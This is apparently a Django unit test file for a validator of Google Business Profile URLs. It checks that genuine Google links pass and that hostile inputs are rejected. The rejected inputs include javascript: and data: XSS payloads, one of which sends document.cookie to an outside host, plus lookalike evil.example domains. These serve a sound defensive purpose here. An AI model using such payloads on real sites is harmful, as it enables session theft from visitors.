"""The GBP URL is opened by every profile visitor, so it must be a real Google https link (audit AG1)."""
from django.test import SimpleTestCase

from apps.agents.views.gbp import _is_valid_gbp_url


class GbpUrlValidationTests(SimpleTestCase):
    def test_real_google_links_pass(self):
        for url in (
            "https://maps.google.com/?cid=123",
            "https://www.google.com/maps/place/Foo",
            "https://maps.app.goo.gl/AbC123",
            "https://g.page/my-agency",
            "https://business.google.com/dashboard",
        ):
            self.assertTrue(_is_valid_gbp_url(url), url)

    def test_script_and_foreign_links_fail(self):
        for url in (
            "javascript:fetch('//x/'+document.cookie)//maps.google.com",
            "JaVaScRiPt:alert(1)//business.google.com",
            "data:text/html,<script>alert(1)</script>maps.google.",
            "https://evil.example/maps.google.com",
            "https://maps.google.com.evil.example/",
            "maps.google.com/?cid=1",
        ):
            self.assertFalse(_is_valid_gbp_url(url), url)
